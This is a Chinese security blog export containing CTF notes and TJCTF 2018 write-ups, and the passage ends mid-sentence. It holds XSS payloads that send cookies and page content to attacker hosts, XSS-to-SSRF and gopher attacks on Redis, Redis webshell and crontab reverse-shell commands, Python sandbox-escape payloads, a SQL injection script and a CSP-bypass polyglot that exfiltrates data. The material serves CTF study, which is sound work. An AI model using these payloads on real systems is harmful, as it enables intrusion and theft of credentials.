看wp和复现wp完全不一样 大部分wp只写了最后的正确解法 而不写怎么想到的 试过的错误方法 以及实际操作中可能遇到的无数个坑点 tjctf上有两道稍难(对我这个菜鸡来说)的web 每道我都思考并尝试了三四天才得以解出 但wp可能只写了最后找到的正确思路 所以你不复现是体会不到当时做题者的艰辛的 最后一开始可能就能做一些套路题目不是能么有趣(其实我觉得也挺好玩) 但当你有了一些积累去分析稍难点的题目时就能真正体会到ctf的乐趣 你需要测试 分析 并快速学习题目中新的知识点部分来解出题目 与之伴随的当然是满满滴成就感XD","categories":[],"tags":[]},{"title":"xss和Redis总结","slug":"xss和Redis总结","date":"2018-08-16T13:01:05.000Z","updated":"2018-08-21T10:09:53.295Z","comments":true,"path":"2018/08/16/xss和Redis总结/","link":"","permalink":"http://Merl1ng.com/2018/08/16/xss和Redis总结/","excerpt":"总结一些知识点","text":"总结一些知识点 xss基础操作首先尝试一些基本的方法 &lt;script&gt;alert(1)&lt;/script&gt; 看看报不报csp的错误 如果不报但不弹窗应该是过滤了 继续尝试别的 12345&lt;img src=x onerror= /&gt;&lt;svg onload&gt;&lt;svg/onload&gt; 还有好多参考http://www.freebuf.com/articles/web/20282.html 假设&lt;svg/onload&gt;可以 那么继续 &lt;svg/onload=&quot;document.location=&#39;http://vps_ip:233&#39;&quot;&gt; 测试vps上能不能收到回显 可以的话开始 打cookie&lt;svg/onload=&quot;document.location=&#39;http://xxx.ceye.io/?&#39;+document.cookie&quot;&gt; 获取页面内容&lt;svg/onload=&quot;document.location=&#39;http://xxx.ceye.io/?&#39;+btoa(document.body.innerHTML)&quot;&gt; 如果不行尝试编码 document.location=&#39;http://xxx.ceye.io/?&#39;+btoa(document.body.innerHTML)编码为1&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x75;&amp;#x67;&amp;#x65;&amp;#x6c;&amp;#x67;&amp;#x72;&amp;#x2e;&amp;#x63;&amp;#x65;&amp;#x79;&amp;#x65;&amp;#x2e;&amp;#x69;&amp;#x6f;&amp;#x2f;&amp;#x3f;&amp;#x27;&amp;#x2b;&amp;#x62;&amp;#x74;&amp;#x6f;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x69;&amp;#x6e;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4d;&amp;#x4c;&amp;#x29; 1&lt;svg/onload=\"&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x75;&amp;#x67;&amp;#x65;&amp;#x6c;&amp;#x67;&amp;#x72;&amp;#x2e;&amp;#x63;&amp;#x65;&amp;#x79;&amp;#x65;&amp;#x2e;&amp;#x69;&amp;#x6f;&amp;#x2f;&amp;#x3f;&amp;#x27;&amp;#x2b;&amp;#x62;&amp;#x74;&amp;#x6f;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x69;&amp;#x6e;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4d;&amp;#x4c;&amp;#x29;\"&gt; 然后解码后保存到本地html里打开即可 结合ssrf读其他页面从这里开始用了 ajax 就是用 js 执行 http 请求 xss的思路结合ajax真的很强 xss不止能打cookies 可以像ssrf般操作内网 123456789101112&lt;svg/onload=\"xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(\"GET\",\"request.php\",true);xmlhttp.send();\"&gt; 结合ssrf+file协议12345678910111213&lt;svg/onload=\"xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(\"POST\",\"request.php\",true);xmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");xmlhttp.send(\"url=file:///etc/passwd\");\"&gt; 结合gopher未授权访问打redis这里是未授权访问 拿到数据 还没有getshell 12345678910111213&lt;svg/onload=\"xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(\"POST\",\"request.php\",true);xmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");xmlhttp.send(\"url=gopher://127.0.0.1:25566/_info%250a_quit\");\"&gt; 再更改send行进行其它查询 比如 xmlhttp.send(“url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit”); xmlhttp.send(“url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit”); 参考http://skysec.top/2018/08/14/xss-ssrf-redis/ 绕csphttps://www.jianshu.com/p/f1de775bc43e 这块还不怎么熟 先挖个坑 Redis刚好看xss的时候又遇到了 redis的问题 就再记录一下 未授权访问redisRedis默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，可以成功在Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。默认redis启动的用户如果没有修改，会以root方式启动，这样就redis就可以在任意位置写入公钥文件，继而可以完成远程控制。 大意就是可以访问到在内网本来不想让我们访问的redis getshell1、通过向Web目录中写webshell的方式进行getshell 1234config set dir /home/wwwroot/default/config set dbfilename redis.phpset webshell \"&lt;?php phpinfo(); ?&gt;\"save 2、通过写SSH key的方式进行getshell 这种感觉见得不多 3、通过写corntab的方式进行getshell 第1步：通过redis-cli进入交互式shellredis-cli.exe -h 192.168.182.128 -p 6379 redis-cli.exe -h 192.168.182.128 -p 6379 image第2步：设置文件夹路径config set dir /var/spool/cron/crontabs config set dir /var/spool/cron/crontabs 第3步：修改备份文件名config set dbfilename root config set dbfilename root 第4步：设置计划任务set -.- “\\n\\n\\n * bash -i &gt;&amp; /dev/tcp/198.xx.xx.xxx/9999 0&gt;&amp;1\\n\\n\\n” set -.- “\\n\\n\\n * bash -i &gt;&amp; /dev/tcp/198.xx.xx.xxx/9999 0&gt;&amp;1\\n\\n\\n” 第5步：保存 第6部：监听公网机器指定端口，接收反弹回来的shellnc -v -l -p 9999 nc -v -l -p 9999 参考http://foreversong.cn/archives/1180","categories":[],"tags":[]},{"title":"python沙盒逃逸","slug":"python沙盒逃逸","date":"2018-08-16T09:53:35.000Z","updated":"2018-08-18T08:12:50.853Z","comments":true,"path":"2018/08/16/python沙盒逃逸/","link":"","permalink":"http://Merl1ng.com/2018/08/16/python沙盒逃逸/","excerpt":"tjctf上遇到了好几道py沙盒逃逸的题目","text":"tjctf上遇到了好几道py沙盒逃逸的题目 参考https://blog.csdn.net/qq_35078631/article/details/78504415https://bestwing.me/awesome-python-sandbox-in-ciscn.htmlhttps://xz.aliyun.com/t/52#toc-5https://www.anquanke.com/post/id/85571https://blog.csdn.net/wy_97/article/details/80393854 这几篇文章都挺好的 读了好几遍 内敛函数在python中 不用引入直接使用的内置函数称为 builtin 函数,随着builtin这一个module 自动被引入到环境中 而它十分强大 可以 dir(‘builtins’) 查看 如果一些 内敛函数在builtins删除 ，我们可以通过reload(__builtins__)重新载入获取一个完整的builtins 创建对象，以及引用有常见的两个方法 ().__class__.__bases__[0]&#39;&#39;.__class__.__mro__[2] 常见payload12345678#读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls /var/www/html\").read()' ) __dict__和 __getattribute__一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”] 进而，我们可以通过__dict__引入我们想要引入的模块 __getattribute__是访问属性的方法 比如某个比赛的payload 1234x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__x.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')x.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s /home/ctf')x.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb') 其中 linecache 模块的作用是将文件内容读取到内存中 这题还能用pwn中改got表的方法做 不过暂时看不懂orz 稍微了解下got表https://blog.csdn.net/qq_18661257/article/details/54694748 补充:GOT表和PLT表为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的 PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址 其实在进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GOT表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。 那问题来了，这个@plt函数时怎么来的，这个函数是编译系统自己加的 可以通过disas gets看看里面的代码","categories":[],"tags":[]},{"title":"tjctfwp","slug":"tjctfwp","date":"2018-08-13T06:56:15.000Z","updated":"2018-08-16T13:46:49.162Z","comments":true,"path":"2018/08/13/tjctfwp/","link":"","permalink":"http://Merl1ng.com/2018/08/13/tjctfwp/","excerpt":"挺好的比赛 做了快一周","text":"挺好的比赛 做了快一周 webEss Kyoo EllEss Kyoo Ell 一查就是sql的意思 随便输些邮箱密码 但怎么输都是 no column : password 然后我把password改成pass 发现报错 no column : pass 可以看出给的email和password参数只是幌子 它会把你输的键值对的参数名放入数据库中查询 干脆邮箱都不输直接输pass 果然还是 no column : pass 这里自然想到联合注入 ‘ union select xxx –+ 的形式成功闭合 然后试下列数 7 列 ‘union select 1,2,3,4,5,6,7 –+ 回显了一些有用的字段名 但想再查这些字段还是报错 no column 应该是表名不对 到此为止准备工作就完成了 一开始当mysql做的gg 后来查了下报错的语句应该是sqlite sqlite_version(*) 返回SQLite的版本 试了下可以果然是sqlite 回显了一些有用的字段名 但想再查这些字段还是报错 no column 应该是表名不对 sqlite的隐藏表是 sqlite_master ‘union select 1,2,3,4,5,6,7 –+ sqlite_master表中的字段有type,name,tbl_name,rootpage,sql name字段可以获取所有表名 ‘union select name,2,3,4,5,6,7 from sqlite_master –+ 表名是users 改为from users 再查id username ip_address什么就不会提示 no column 了 but这里就到了第二个坑点 limit 试了一下 总共有1000个数据 而题目要求是admin的ip_address 很显然要用 where语句限制 但一用where就会出现各种错误 gg where用不了 所以只能用limit一个一个遍历 但如何保证数据匹配呢 后来想到了 同时查 username ip_address 这样回显的应该是匹配的数据 为了确认这一点 我同时查询了 email (试几个可以发现email与username是一一对应的) 果真如此 确实匹配 不过即使这样数据量还是很多 这里我由试了试 发现了一个关键点 就是哪个字段先放前面结果就会按这个字段的字典序排列 admin a和d应该在比较前面所以构造 union select username,ip_address,email,first_name,last_name,gender,id from users limit x,1 –+ 不断改变x的值即可 这里也懒得手动了 写了个脚本 123456789101112131415#!/usr/bin/env pythonimport requestsflag = \"\"url = \"https://ess-kyoo-ell.tjctf.org/\"for i in range(0,1000): data = &#123;\"'union select username,ip_address,email,first_name,last_name,gender,id from users limit \"+str(i)+',1 --+':''&#125; s = requests.post(url,data=data).content #print i if 'admin' in s: print s break but写脚本这里还有最后一个坑点 以往的post请求中data键值对 都是参数名:值 但这个由于payload是参数名 所以要写成 payload : ‘’(后面留空)的形式 不过留不留空应该也无所谓 它好像只匹配到参数名 这题做了蛮久的 但也学到了很多 request me感觉有点玄学的一道 也是做了好久 有一个 HTTP Basic auth认证https://www.cnblogs.com/rinack/p/7595232.htmlhttps://code.csdn.net/ZhuTH/zthblog/tree/master/views/admin.py 一开始github搜了个爆破脚本跑了好久 当然gg 后来试了好久 结束前一晚做出来的 根据题目提示改请求方法为options 提示 put delete get post options 和参数 username password 并说有些方法需要验证 (basic auth) 不带username password put会说你的凭证在哪 我没偷 那肯定要带 带就会说 我偷了你的凭证 然后再用delete 我想凭证吗 就它显示的那个cen什么的单词 也带上请求 结果就拿到了flag.. 首先让 post 200(咋让200也挺玄学 多试几次或许可以。。) 然后 put 不带参数 put 带参数 delete 增加参数 当你成功后想再试一遍 可能又不行了。。 真的玄学 我看了其他师傅的一个视频题解 用的curl解的 –data 指定参数 -u指定验证的数据 格式 xx:xx 看起来curl挺方便的 不过他也是这种玄学问题 同样方法再来一遍就gg 而且视频中也有些地方感觉说错了 Moar Horses贼奇葩的一道题 hint写了不是真正的web 好吧真的不是。。 提示向下滚动 但你拉拉鼠标咋看都没有尽头 然而正确解法还真是这样 但关键点我没注意到 在向下滚动同时页面实际上在不断进行新的请求 请求的是 https://moar_horse.tjctf.org/legs 不断向下滚动好久好久就会出现flag 这里当然不能手动 用几句js代码代替 window.setInterval(function()(window.scrollByLines(10000)),1) 然后按照大小排序 静静等待就行了 好吧 其实不断请求就行了。。 123456789import requestsurl = \"https://moar_horse.tjctf.org/legs\"while True: res = requests.get(url).text if \"Oops\" not in res: print(res) break Programmable Hyperlinked Pastaphp文件读取 ../flag.txt Stupid Blogweb的压轴题 题目说什么向admin要 可能有xss 页面有个传文件的地方 或许要getshell 还有个地方可以保存文本 有个按钮可以提交给admin 这里估计就是xss点 xss的题目我是不怎么熟悉的 看起来很吃力 这个有csp的限制 随便xss一下会有csp的报错 需要绕过 content-security-policy: default-src ‘self’ 就是所有的外部资源，都只能从当前域名加载 先了解下 csphttp://www.ruanyifeng.com/blog/2016/09/csp.html 题目还有个上传头像的地方应该不是随便给的 所以考虑通过上传图片绕过csp https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs 这篇文章就是这个思路 并且给了我们图片poc 只需要把*/=alert(&quot;Burp rocks.&quot;);/* 改成 */=x=new XMLHttpRequest();x.open(&quot;GET&quot;,&quot;admin&quot;,false);x.send(null);document.location=&quot;http://merl1n.proxy.beeceptor.com/y&quot;+x.responseText;/* 但这个执行成功还有个条件 要允许 polyglot 查了下应该就是要支持多国语言 要插入一段js 说下这里src为什么是 merl1ng/pfp src这里要写的是图片的路径 merl1ng是注册的用户名同时是分配的目录名 pfp是你传图片时回显的 saved pfp 说明文件名是pfp 那为啥不咋根目录下呢 当然有可能 路径是试出来的 刚好把它写入题目中保存文本的地方 然后提交即可打到 还有为啥路径不像文章中那样写完整 https://stupid_blog.tjctf.org/merl1ng/pfp 因为你这样写就会报错 Post content is too long 好了 终于理完了思路和坑点 GET 后面就是 admin页面的所有内容 flag也在里面 1/y%3C!DOCTYPE%20html%3E%3Chtml%20lang=%22en%22%3E%3Chead%3E%20%20%20%20%3Ctitle%3Eadmin%3C/title%3E%3Cmeta%20charset=%22UTF-8%22%3E%3Cmeta%20name=%22viewport%22%20content=%22width=device-width,%20initial-scale=1%22%3E%3C!--===============================================================================================--%3E%3Clink%20rel=%22icon%22%20type=%22image/png%22%20href=%22/images/icons/favicon.ico%22/%3E%3C!--===============================================================================================--%3E%3Clink%20rel=%22stylesheet%22%20type=%22text/css%22%20href=%22/vendor/bootstrap/css/bootstrap.min.css%22%3E%3C!--===============================================================================================--%3E%3Clink%20rel=%22stylesheet%22%20type=%22text/css%22%20href=%22/fonts/font-awesome-4.7.0/css/font-awesome.min.css%22%3E%3C!--===============================================================================================--%3E%3Clink%20rel=%22stylesheet%22%20type=%22text/css%22%20href=%22/vendor/animate/animate.css%22%3E%3C!--===============================================================================================--%3E%3Clink%20rel=%22stylesheet%22%20type=%22text/css%22%20href=%22/vendor/css-hamburgers/hamburgers.min.css%22%3E%3C!--===============================================================================================--%3E%3Clink%20rel=%22stylesheet%22%20type=%22text/css%22%20href=%22/vendor/select2/select2.min.css%22%3E%3C!--===============================================================================================--%3E%3Clink%20rel=%22stylesheet%22%20type=%22text/css%22%20href=%22/css/util.css%22%3E%3Clink%20rel=%22stylesheet%22%20type=%22text/css%22%20href=%22/css/main.css%22%3E%3C!--===============================================================================================--%3E%3C/head%3E%3Cbody%3E%20%20%3Cdiv%20class=%22limiter%22%3E%3Cdiv%20class=%22container-login100%22%3E%3Cdiv%20class=%22wrap-login100%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22login100-pic%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22login100-form-btn%22%20href=%22/report%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Report%20a%20User%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22login100-pic%20js-tilt%22%20data-tilt%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src=%22/admin/pfp%22%20alt=%22IMG%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20class=%22login100-form%22%20method=%22POST%22%20action=%22/edit_pfp%22%20enctype=%22multipart/form-data%22%3E%3Cspan%20class=%22login100-form-title%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Update%20Profile%20Picture%20(png,%20jpg)%3C/span%3E%3Cdiv%20class=%22wrap-input100%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20class=%22input100%20fileinput%22%20type=%22file%22%20name=%22pfp%22%3E%3Cspan%20class=%22focus-input100%22%3E%3C/span%3E%3Cspan%20class=%22symbol-input100%22%3E%3Ci%20class=%22fa%20fa-image%22%20aria-hidden=%22true%22%3E%3C/i%3E%3C/span%3E%3C/div%3E%3Cdiv%20class=%22container-login100-form-btn%22%3E%3Cbutton%20class=%22login100-form-btn%22%3ESave%3C/button%3E%3C/div%3E%3C/form%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20class=%22login100-form%20validate-form%22%20method=%22POST%22%20action=%22/edit/admin%22%3E%3Cspan%20class=%22login100-form-title%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20admin's%20Posts%20-%20%3Ca%20href=%22/logout%22%3ELogout%3C/a%3E%3C/span%3E%3Cdiv%20class=%22wrap-input100%20validate-input%22%20data-validate%20=%20%22Content%20is%20required%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20class=%22input100%22%20type=%22text%22%20name=%22content%22%20value=%22tjctf%7B1m4g3_p0lygl0t_1s_w3ird%7D%22%3E%3Cspan%20class=%22focus-input100%22%3E%3C/span%3E%3Cspan%20class=%22symbol-input100%22%3E%3Ci%20class=%22fa%20fa-user%22%20aria-hidden=%22true%22%3E%3C/i%3E%3C/span%3E%3C/div%3E%3Cdiv%20class=%22container-login100-form-btn%22%3E%3Cbutton%20class=%22login100-form-btn%22%3ESave%3C/button%3E%3C/div%3E%3Cdiv%20class=%22text-center%20p-t-136%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20tjctf%7B1m4g3_p0lygl0t_1s_w3ird%7D%3C/div%3E%3C/form%3E%3C/div%3E%3C/div%3E%3C/div%3E%3Cscript%20src=%22/vendor/jquery/jquery-3.2.1.min.js%22%3E%3C/script%3E%3Cscript%20src=%22/vendor/bootstrap/js/popper.js%22%3E%3C/script%3E%3Cscript%20src=%22/vendor/bootstrap/js/bootstrap.min.js%22%3E%3C/script%3E%3Cscript%20src=%22/vendor/select2/select2.min.js%22%3E%3C/script%3E%3Cscript%20src=%22/vendor/tilt/tilt.jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=%22/js/main.js%22%3E%3C/script%3E%20%20%20%20tjctf%7B1m4g3_p0lygl0t_1s_w3ird%7D%3C/body%3E%3C/html%3E 话说 beeceptor.com 这网站还挺好用的 而且不用注册 Central Savings Account有个表单 但测试一下根本没交互 那估计是js了 看下本地的js 果然 miscSsleepy流量包分析 随手一个追踪流 可以看到 key.zip 这里还给了ftp协议的账号密码 我连了下试试 gg 然后我就想提取 key.zip 流量里找了找没有 百度搜了下 可以formest（应该不是这么拼的） 但f什么能做的binwalk也可以 binwalk 一下真有点东西 -e拿出来 发现是个pem格式的私钥 立马想到ddctf上那道 回去查了下基本一样 wireshark把私钥导进去就可以看到解密过后新的流量 看到flag.jpg 再往后三个 FFD8一看就是jpg文件头 随即这三个就是hex形式的flag.jpg 提取出来放winhex里 拿到flag图片 回来看 题目其实提示了 ssl We Will Rock You给了个狗狗币钱包的相关文件 让找到密码 之前没做过的类型 一脸懵逼 看题解倒是很简单 https://github.com/gurnec/btcrecover.git 用这个脚本找个字典爆破就行了 当时看这比较陌生虚了 应该去github上搜一波的 https://theflagisnothere.github.io/categories/TJCTF%202018/We%20Will%20Rock%20You/ Huuuuuge题目是这样的 123Don't think too deep.104.154.187.226/huuuuuge 访问这个url不行 这里稍微脑洞了一下huge 把ip加了加试试 然后gg 正确做法是nmap扫描 发现 git 其实我当时也扫了 但对git相关操作没啥影响 忽略掉了。。 然后要用 git clone 但这里的命令还要复杂一点 之前没有见过 git clone –depth 1 git://104.154.187.226/huuuuuge flag https://theflagisnothere.github.io/categories/TJCTF%202018/Huuuuuge/ Learn_My_Flag很明确告诉了给的是机器学习相关的文件 打开搜了下信息 应该是keras 然后。。就没然后了 只在建模时候学过一点点 并不会做这题 解法参考https://github.com/TheRealOddCoder/tjctf2018/tree/master/Learn_My_Flag 机器学习相关的题目 17hctf上有一道 强网杯有一道 估计和区块链一样以后出现次数会增加 ctfer真的是啥都要学orz Nothing but Everything说是文件被勒索软件加密了 看了下都是十进制 猜测要么用还原软件 要么转16转ascii 搜了解密软件发现好多种 要根据被加密的文件特征选择 但这题的文件数据没啥特征 那么就应该是思路二 但看这题在比较后面了 懒得做了。。 看了下题解应该就是这样做的 Mirror Mirrorpy的沙盒 以前见过没学过 这次刚好看看 学到了大佬们的好多种思路 所有方法都应首先完成这两步 12345678910111213141516171819202122232425262728293031323334&gt;&gt;&gt; dir(get_flag)[ '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name'] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&gt;&gt;&gt; get_flag.func_globals&#123; 'PseudoFile':&lt;class '__main__.PseudoFile'&gt;, 'code':&lt;module 'code' from '/usr/lib/python2.7/code.pyc'&gt;, 'bad':[ '__class__', '__base__', '__subclasses__', '_module', 'open', 'eval', 'execfile', 'exec', 'type', 'lambda', 'getattr', 'setattr', '__', 'file', 'reload', 'compile', 'builtins', 'os', 'sys', 'system', 'vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply' ], '__builtins__':&lt;module '?' (built-in)&gt;, '__file__':'/home/app/problem.py', 'execfile':&lt;built-in function execfile&gt;, '__package__':None, 'sys':&lt;module 'sys' (built-in)&gt;, 'getattr':&lt;built-in function getattr&gt;, 'Shell':&lt;class __main__.Shell at 0x7f1979641c80&gt;, 'banned':[ 'vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply' ], 'InteractiveConsole':&lt;class code.InteractiveConsole at 0x7f1979641c18&gt;, 'eval':&lt;built-in function eval&gt;, 'get_flag':&lt;function get_flag at 0x7f19796518c0&gt;, '__name__':'__main__', 'main':&lt;function main at 0x7f1979664410&gt;, '__doc__':None, 'print_function':_Feature((2, 6, 0, 'alpha', 2 ), (3, 0, 0, 'alpha', 0 ), 65536 )&#125; 重置黑名单12345678910111213141516&gt;&gt;&gt; get_flag.func_globals.keys() #这里其实get_flag.func_globals就能看到['PseudoFile', 'code', 'bad', '__builtins__', '__file__', 'execfile','__package__', 'sys', 'getattr', 'Shell', 'banned', 'InteractiveConsole','eval', 'get_flag', '__name__', 'main', '__doc__', 'print_function']&gt;&gt;&gt; get_flag.func_globals[\"banned\"]['vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help','open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file','reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer','apply']&gt;&gt;&gt; get_flag.func_globals[\"bad\"]['__class__', '__base__', '__subclasses__', '_module', 'open', 'eval','execfile', 'exec', 'type', 'lambda', 'getattr', 'setattr', '__', 'file','reload', 'compile', 'builtins', 'os', 'sys', 'system', 'vars', 'getattr','setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview','eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr','staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'] 把黑名单置空 12&gt;&gt;&gt; get_flag.func_globals[\"banned\"] = []&gt;&gt;&gt; get_flag.func_globals[\"bad\"] = [] 最后 1234&gt;&gt;&gt; fd = open(\"/home/app/problem.py\") #路径在get_flag.func_globals里面可以读到&gt;&gt;&gt; data = fd.read()&gt;&gt;&gt; fd.close()&gt;&gt;&gt; print(data) 读出源文件里就有混淆过的flag 直接 在py2在print就有flag 这里重置完黑名单还有一种思路 直接get_flag.func_globals[‘sys’].modules[‘os’].system(‘/bin/sh’) 拿到shell 然后 ls cat 获取 os.system 函数12345678&gt;&gt;&gt; ops = get_flag.func_globals['sy'+'s'].modules['o'+'s'] # Get the \"os\" module&gt;&gt;&gt; gtattr = get_flag.func_globals['getatt' + 'r'] # Since \"getattr\" is blocked, we need to get it from \"get_flag\"&gt;&gt;&gt; stm = gtattr(ops, 's' + 'ystem') # Get the \"os.system\" function&gt;&gt;&gt; stm('ls')problem.pywrapper0&gt;&gt;&gt; stm('cat problem.py') 读出文件后同上 仅使用特殊字符生成字符串https://github.com/Lev9L-Team/ctf/tree/master/2018-08-07_tjctf/mirror_mirror 反弹 shellhttp://www.aperikube.fr/docs/tjctf_2018/mirror_mirror/ Lexington State Bank提示的很明显了 图片的lsb隐写 stegsolve做了下不是很好提取 后来直接用之前一个比赛上见过的 zsteg 直接就出来了 （这个要装ruby环境） Interference这题zz了 v1 v2两张雪花图 先stegsolve 两张xor等等操作了一遍 v1 stegsolve操作了一遍 没动西我就没动了 结果v2 stegsolve过一遍就有。。。。。当时智障了 v2大小比v1大 但像素大小一模一样 很明显终点应该在v2上 当时还ps试了下之前见过的差值。。 The Abyss分最高的题 还是py的沙盒 应该要拿到shell 难点在于过滤了 _ https://kmh.zone/writeups/tjctf-2018/theabyss.htmlhttp://blog.seekintoo.com/the-abyss-writeup.html cryptoCaesar’s Complication这题我要吹一年 如果是动态分数制这道就是做出来中分最高的一题 给的东西结合题目肯定就是rot加密 0-13共14种 查找关键字 首先ctrl f 就可以横向查找 tjctf 或者倒过来 ftcjt 但试一圈gg 然后由于数据是100*100的方阵 我猜是转置过的 竖向查找 这一般软件没这功能 眼看要累死 必须要写脚本 这里因为对c的二维数组比较熟悉 没有选择用python 但写c也是不断的在踩坑。。 刚开始用的读字节 fgetc 读是能读 but跳出那个循环就gg了 打印不出二维数组刚才读的元素 printf puts全部gg 后来用的 fscanf(fp,”%s”,s[i]); 调了下数组正好为100x100才成功 fgetc 100x100就不行 发现好像是读多的话就会出现那种异常现象 可能是c语言机制问题 没深究 再查下主副对角线及其颠倒 共计 